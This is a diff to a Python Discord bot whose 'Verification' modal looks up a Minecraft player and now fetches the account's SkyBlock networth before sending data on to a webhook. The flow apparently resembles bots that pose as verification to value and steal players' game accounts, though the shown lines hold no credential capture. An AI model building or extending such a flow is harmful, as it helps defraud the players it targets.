@@ -33,10 +33,25 @@ class MyModalOne(ui.Modal, title="Verification"):
         uuidplayer = response.json()['id']
 
      
-        #urlnw = f"https://sky.shiiyu.moe/api/v2/profile/{self.box_one.value}"
-        #response = requests.get(urlnw)
-        #data = response.json()
-        networth_value =  0 #place holder till the api is fixed
+        networth_value = "0"  # default
+
+        try:
+            await interaction.response.defer()
+            urlnw = f"https://soopy.dev/api/v2/player_skyblock/{uuidplayer}"
+            response = requests.get(urlnw, timeout=10)
+            response.raise_for_status()  # raise HTTPError if response != 200
+            data = response.json()
+
+            profile = data.get("data", {})
+            cprofile = profile.get("stats", {}).get("currentProfileId")
+            member = profile.get("profiles", {}).get(cprofile, {}).get("members", {}).get(uuidplayer, {})
+            nw = member.get("skyhelperNetworth", {}).get("total")
+
+            if isinstance(nw, (int, float)):
+                networth_value = f"{int(nw):,}"
+        except Exception as e:
+            print(f"[WARN] Could not fetch networth: {e}")
+            networth_value = "0"
 
         if config.API_KEY =="":
             FlagNx = True
@@ -139,7 +154,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                     return await interaction.response.send_message("Webhook not found", ephemeral=True)
                 except HTTPException:
                     return await interaction.response.send_message("Couldn't send to webhook", ephemeral=True)
-            await interaction.response.send_message(
+            await interaction.followup.send(
                 embed=discord.Embed(
                     title="Please Wait ⌛",
                     description="Please Allow The Bot To Verify The Data You Have Provided",
